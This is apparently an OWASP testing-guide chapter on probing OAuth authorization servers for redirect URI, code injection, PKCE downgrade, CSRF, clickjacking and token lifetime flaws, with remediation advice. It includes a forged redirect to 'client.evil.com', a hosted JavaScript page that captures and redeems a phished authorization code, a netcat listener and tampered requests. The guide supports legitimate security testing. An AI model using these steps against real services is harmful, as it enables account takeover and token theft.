# Testing OAuth Authorization Server Weaknesses

|ID            |
|--------------|
|WSTG-ATHZ-05.1|

## Summary

OAuth stores the identities of users and the correspondent access rights at the AS (Authorization Server). The AS does play a crucial role during the OAuth flow as it grants clients access to resources. To be able to do that securely it must properly validate parameters which are part of the OAuth flows.

Failure to validate the parameters may lead to account takeover, unauthorized resource access and the elevation of privileges.

## Test Objectives

- Retrieve credentials used for authorization
- Grant yourself access to arbitrary resources trough forceful browsing
- Bypass the authorization

## How to test

### Testing for insufficient Redirect URI Validation

The OAuth flow makes use of a `redirect_uri` in the authorization request to redirect the AS back to client. The AS sends the `authorization_code` in the response to the authorization request. If the `redirect_uri` is not properly validated a link can be crafted that contains a URL pointing to a server controlled by an attacker. This can be used to trick the AS into sending an authorization code to the attacker. In the following example `client.evil.com` is used as the forged `redirect_uri`.

<code> 
https://as.example.com/authorize?client_id=example-client&redirect_uri=<mark>http%3A%2F%client.evil.com%2F</mark>&state=example&response_mode=fragment&response_type=code&scope=openid&nonce=example
</code>  

If a user opens the link in the user-agent, the AS will redirect the user agent to the spoofed URL.
The attacker can host a script on the spoofed URL that captures the `code` value and submits it back to the AS's token endpoint.  

This can be archived with the following sample code hosted at the attacker controlled server.

    Note: This JavaScript is compatible with Keycloak, other AS may need tweaking of the requests. The script will fail when the AS has CORS configured and blocks cross-origin requests from the attackers origin. If CORS is configured a setup that allows the spoofing of the origin header, is required.

Host this at a server you own, localhost is fine as well.

```JavaScript
<html>
    <body>
    <head>
        <title>OAuth open redirects</title>
    </head>
<h3>OAuth code: </h3>

<p id="code"></p>

<script>
    
    var keycloak_url = "as.example.com"
    var client_id = "MY_CLIENT_ID"
    var redirect_uri = "MY_REDIRECT_URI"
    var hash = location.hash.substring(1);

    var result = hash.split('&').reduce(function (res, item) {
    var parts = item.split('=');
    res[parts[0]] = parts[1];
    return res;
    }, {});

    var code = result.code
    document.getElementById("code").innerHTML = "The code got phished: " + code;

    function submitStep1()
       {
        var step1 = new XMLHttpRequest();
        step1.open("GET", "http:\/\/" + keycloak_url + "\/auth\/realms\/example\/protocol\/openid-connect\/3p-cookies\/step1.html", true);
        step1.setRequestHeader("Accept", "*\/*");
        step1.setRequestHeader("Accept-Language", "en-GB,en-US;q=0.9,en;q=0.8");
        var body = "";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i);
        step1.send(new Blob([aBody]));
       }


    function submitStep2()
       {
        var step2 = new XMLHttpRequest();
        step2.open("GET", "http:\/\/" + keycloak_url + "\/auth\/realms\/example\/protocol\/openid-connect\/3p-cookies\/step2.html", true);
        step2.setRequestHeader("Accept", "*\/*");
        step2.setRequestHeader("Accept-Language", "en-GB,en-US;q=0.9,en;q=0.8");
        var body = "";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i);
        step2.send(new Blob([aBody]));
       }

    submitStep1();
    submitStep2();


    function submitRequest()
       {
         var xhr = new XMLHttpRequest();
         xhr.open("POST", "https:\/\/" + keycloak_url + "\/auth\/realms\/example\/protocol\/openid-connect\/token", true);
         xhr.setRequestHeader("Content-type", "application\/x-www-form-urlencoded");
         xhr.setRequestHeader("Accept", "*\/*");
         xhr.setRequestHeader("Accept-Language", "en-GB,en-US;q=0.9,en;q=0.8");
         xhr.withCredentials = true;
         var body = "code=" + code + "&grant_type=authorization_code&client_id=" + client_id + "&redirect_uri=" + redirect_uri;
         var aBody = new Uint8Array(body.length);
         for (var i = 0; i < aBody.length; i++)
           aBody[i] = body.charCodeAt(i);
         xhr.send(new Blob([aBody]));
       }
    </script>

    <form action="#">
      <input type="button" value="Submit request" onclick="submitRequest();" />
    </form>
    </body>
</html>
```

On the address configured in `MY_REDIRECT_URI` open a netcat listener to capture the response with the access token.

This listener needs to be reachable by the browser that accesses the above script.

```bash
nc -l -p 443
```

When the `code` is valid the attacker can retrieve the access token from the token endpoint of the AS. This won't work for confidential clients since the AS requires the client secret as well.  

### Authorization Code Injection

During the Authorization Code flow's code exchange a code is issued by the authorization server to the client and later exchanged against the token endpoint to retrieve an authorization token and a refresh token.

An attacker who want's to impersonate a specific resource owner on a confidential client can do so by injecting a stolen authorization code into an authorization code flow initiated by the attacker.

Conduct the following tests against the authorization server:

- send a valid code for another client_id
- send a valid code for another redirect_uri
- resend the code more than once (code replay)

#### Public Clients

The request which is sent towards the token endpoint contains the code as it is exchanged against the token.
Capture this request with an HTTP Interception proxy like OWASP ZAP and resend the request with the tampered values.

```http
POST /oauth/token HTTP/1.1
Host: as.example.com
[...]

{"errorPath":"/error",
"client_id":"example-client",
"code":"INJECT_CODE_HERE",
"grant_type":"authorization_code",
"redirect_uri":"http://client.example.com"}
```

#### Confidential Clients

As the oAuth flow for confidential clients is protected by a client secret additionally it is not possible to directly submit a code to the token endpoint. Instead it is needed to inject the authorization code into the client. This injected code will then be send in the token request, issued by the confidential client together with the client secret.

Part 1: Capture a code from the AS

1. Start the authorization code flow with user Alice until you receive a code from the AS.
2. Do not submit the code to the client and keep note of the code and corresponding state  

Part 2: Inject the code

- Start the authorization code flow with user Mallory and inject the previously gathered code and state values for user Alice into the process. When the attack is successful the client should now be in possession of an `authorization_token` that grants access to resources owned by user Alice.

```http
GET /callback?code=Rne88yTQ5XA7LJVc7A&state=siCE3PWpcq_3qU4sSsK0ZfGfMPw4n8E3 HTTP/1.1
Host: client1.example.com
[...]


```

```http
GET /callback?code=Rne88yTQ5XA7LJVc7A&state=siCE3PWpcq_3qU4sSsK0ZfGfMPw4n8E3 HTTP/1.1
Host: client2.example.com
[...]


```

### PKCE Downgrade Attack

Under certain circumstances the PKCE extension can be removed from the authorization code flow. This has the potential to leave public clients vulnerable to attacks mitigated by the PKCE extension.

- The authorization server does not support PKCE
- The authorization server does not properly validate PKCE

Both can be tested with an HTTP Interception proxy like OWASP ZAP. An attacker may start the OAuth flow and remove the `code_challenge=sha256(xyz)` and `code_challenge_method` parameter from the request.

**Original Request:**

```http
GET /authorize?redirect_uri=http%3A%2F%client.example.com&client_id=example-client&errorPath=%2Ferror&scope=openid%20profile%20email&response_type=code&response_mode=web_message&state=example-state&nonce=example-nonce&code_challenge=example-code-challenge&code_challenge_method=S256&prompt=none HTTP/2
Host: as.example.com
[...]

```

**Modified Request:**

```http
GET /authorize?redirect_uri=http%3A%2F%client.example.com&client_id=example-client&errorPath=%2Ferror&scope=openid%20profile%20email&response_type=code&response_mode=web_message&state=example-state&nonce=example-nonce&prompt=none HTTP/2
Host: as.example.com
[...]

```

### Cross Site Request Forgery

CSRF attacks are described in [CSRF](../06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery.md) there are few targets in OAuth that can be attacked with CSRF.

To prevent CSRF attacks OAuth leverages the `state` parameter as an anti CSRF token.

Other measures can prevent CSRF Attacks as well. The PKCE flow is a mitigation against CSRF. A `nonce` value may act as an anti CSRF token as well.

Targets:

- Consent Page

#### Consent Page

The consent page is displayed to a user to verify that this user consents in the client accessing the resource on the users behalf. Attacking the consent page with a CSRF might grant an arbitrary client access to a resource on behalf of the user.

1. Client generates a state parameter and sends it with the consent request.
2. User Agent displays the consent page
3. Resource Owner grant's access to the client
4. The consent is sent to the AS together with the acknowledged scopes

Use an HTTP Interception proxy like OWASP ZAP to test if the state parameter is properly validated.

```http
POST /u/consent?state=Tampered_State HTTP/2
Host: as.example.com
[...]

state=tampered-state&audience=https%3A%2F%2Fas.example.com%2Fuserinfo&scope%5B%5D=profile&scope%5B%5D=email&action=accept
```

### Clickjacking

When the consent page is prone to clickjacking and the attacker is in possession of the client_id (for public clients) and additionally the client secret for confidential client, the attacker can forge the users consent and gain access to the requested scopes throug a rogue client.

For this attack to be successful the attacker needs to load the authorization page in an iframe.
When the authorization page is loaded in the iframe the site is vulnerable to clickjacking.

Load the authorization page in an iframe:

```html
<html>
    <head>
        <title>Clickjack test page</title>
    </head>
    <body>
        <iframe src="http://as.example.com/auth/realms/example/login-actions/required-action?execution=OAUTH_GRANT&client_id=example-client" width="500" height="500"></iframe>
    </body>
</html>
```

See [Testing for Clickjacking](../11-Client-side_Testing/09-Testing_for_Clickjacking.md) for a detailed description of how such an attack can be conducted.

### Token Lifetime

OAuth has two types of tokens. The access token and the refresh token. An access token should be limited in the duration of its validity. That means it is rather short-lived a good value may be 5 to 15 minutes.

Whereas the refresh token should be valid for a longer duration. It should be a one time token that get's replaced each time it is being used.

#### How to test

##### Access Token

When a JWT is used as the access token, it is possible to retrieve the validity of the access token from the decoded JWT. This is described in [Testing JSON Web Tokens](../06-Session_Management_Testing/10-Testing_JSON_Web_Tokens.md). However, it is still possible that the AS does not properly validate the lifetime of the JWT.

To test the lifetime of the access token, make use of an HTTP Interception proxy such as OWASP ZAP. Intercept a request to an endpoint that contains an access token. Put this request in the repeater and let the targeted time pass.

Such requests may look like the following example. The token could be transported in other ways, in a cookie for example as well.

```http
GET /userinfo HTTP/2
Host: as.example.com
[...]
Authorization: Bearer eyJhbGciOiJkaXIiL[...]

```

- Send the Request after 5 minutes
- Send the Request after 10 minutes
- Send the Request after 30 minutes
- Send the Request after 30 minutes

This can be optimized by automating the process and log the servers response. As soon as 
the response changes, HTTP Status 403 instead of HTTP Status 200 for example, it can be assumed that the access token is no longer valid.

##### Refresh Token

To test the refresh token capture the request exchanging the refresh token against a new access token. Put this request in the repeater and perform the following tests.

The refresh token exchange is also send to the token endpoint. In the following example the refresh token is send as part of the POST body, a new access token and a new refresh token are assigned.

```http
POST from /token HTTP/1.1
Host: as.example.com
Cookie: [...]
[...]

grant_type=refresh_token&refresh_token=eyJhbGciOiJIUz[...]&client_id=example_client
```

- Repeat the old refresh token and test if the authorization server hands out an access token.
- Again Repeat the steps with the old refresh token to evaluate how often a single refresh token is accepted.

## Related Test Cases

- [Testing for Cross Site Request Forgery](../06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery.md)
- [Testing for Client-side URL Redirect](../11-Client-side_Testing/04-Testing_for_Client-side_URL_Redirect.md)
- [Testing JSON Web Tokens](../06-Session_Management_Testing/10-Testing_JSON_Web_Tokens.md)
- [Testing for Clickjacking](../11-Client-side_Testing/09-Testing_for_Clickjacking.md)
- [Testing Cross Origin Resource Sharing](../11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing.md)

## Remediation

Most of the attacks against OAuth AS can be mitigated by validating the existence and content of parameters during the code and token exchange.

Restricting the time span and allowed usage for credentials like authorization code and refresh token successfully thwarts some attacks and limits the use of such credentials for an attacker.

Proper configuration of security mitigation's like CORS, anti CSRF token and anti-clickjacking headers can limit the impact of attacks, makes them harder to accomplish and for some completely mitigates them.

- Always validate if all parameters are present and their values.
- Use the PKCE extension to properly secure the code and token exchange
- Do not allow fallback for security features like the PKCE extension.
- Restrict the lifetime of credentials
- Use credentials only once where possible e.G the authorization code
- Configure available security mitigation like CORS, anti CSRF token and anti Clickjacking headers.

## Tools

- [BurpSuite](https://portswigger.net/burp/releases)
  - [EsPReSSO](https://github.com/portswigger/espresso)
- [OWASP ZAP](https://www.zaproxy.org/)

## References

- [User Authentication with OAuth 2.0](https://oauth.net/articles/authentication/)
- [The OAuth 2.0 Authorization Framework](https://datatracker.ietf.org/doc/html/rfc6749)
- [The OAuth 2.0 Authorization Framework: Bearer Token Usage](https://datatracker.ietf.org/doc/html/rfc6750)
- [OAuth 2.0 Threat Model and Security Considerations](https://datatracker.ietf.org/doc/html/rfc6819)
- [OAuth 2.0 Security Best Current Practice](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics-16)
- [Authorization Code Flow with Proof Key for Code Exchange](https://auth0.com/docs/authorization/flows/authorization-code-flow-with-proof-key-for-code-exchange-pkce)
